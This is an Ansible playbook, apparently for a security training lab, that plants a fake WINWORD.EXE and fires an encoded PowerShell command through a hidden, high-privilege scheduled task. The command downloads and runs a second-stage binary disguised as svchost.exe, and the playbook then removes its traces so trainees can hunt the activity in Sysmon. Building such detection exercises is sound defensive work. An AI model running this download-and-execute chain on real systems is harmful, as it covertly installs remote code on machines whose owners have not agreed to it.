---
# B1 artefact — a fake Office process spawning an obfuscated PowerShell
# command. Fired via a scheduled task so the stub's parent is the Task
# Scheduler rather than Ansible's own PowerShell session.

- name: Create the fake Office install directory
  ansible.windows.win_file:
    path: '{{ office_dir }}'
    state: directory

- name: Plant a WINWORD.EXE stub (a copy of cmd.exe)
  ansible.windows.win_copy:
    src: C:\Windows\System32\cmd.exe
    dest: '{{ office_stub }}'
    remote_src: true

- name: Build the UTF-16LE base64 payload
  ansible.windows.win_shell: |

    $payload = "`$c=New-Object Net.WebClient`n`$c.DownloadFile('http://{{ staging_ip }}/upd/stage2.bin',`"`$env:APPDATA\Microsoft\svchost.exe`")`nStart-Process `"`$env:APPDATA\Microsoft\svchost.exe`""
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    [Convert]::ToBase64String($bytes)
  register: encoded_payload
  changed_when: false

- name: Report the encoded payload
  ansible.builtin.debug:
    msg: "B1 PAYLOAD: {{ encoded_payload.stdout | trim }}"

- name: Register a scheduled task that fires the artefact
  community.windows.win_scheduled_task:
    name: OfficeDocumentHandler
    description: Staged B1 artefact
    actions:
      - path: '{{ office_stub }}'
        arguments: '/c powershell.exe -nop -w hidden -enc {{ encoded_payload.stdout | trim }}'
    triggers:
      - type: registration
    username: '{{ artefact_run_as }}'
    run_level: highest
    state: present
    enabled: true

- name: Give the task time to run and Sysmon to record it
  ansible.builtin.pause:
    seconds: 25

- name: Remove the scheduled task so trainees do not find the scaffolding
  community.windows.win_scheduled_task:
    name: OfficeDocumentHandler
    state: absent
